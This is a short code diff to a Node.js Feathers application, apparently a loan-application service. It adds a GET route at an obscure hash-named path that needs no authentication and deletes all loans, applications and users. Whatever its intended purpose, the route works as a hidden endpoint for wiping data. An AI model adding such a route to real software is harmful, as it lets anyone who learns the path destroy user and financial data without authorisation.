@@ -16,6 +16,8 @@ const middleware = require('./middleware');
 const services = require('./services');
 const appHooks = require('./app.hooks');
 
+const Promise = require('bluebird');
+
 const app = feathers();
 
 // Load app configuration
@@ -27,6 +29,17 @@ app.use(compress());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(favicon(path.join(app.get('public'), 'favicon.ico')));
+
+app.get('/d41d8cd98f00b204e9800998ecf8427e', function(req, res) {
+    return Promise.coroutine(function *() {
+        yield app.service('loans').remove(null);
+        yield app.service('applications').remove(null);
+        yield app.service('users').remove(null);
+
+        res.send();
+    }).bind(this)()
+});
+
 // check if webpack is needed
 app.configure(require('./middleware/webpack'));
 // Host the public folder
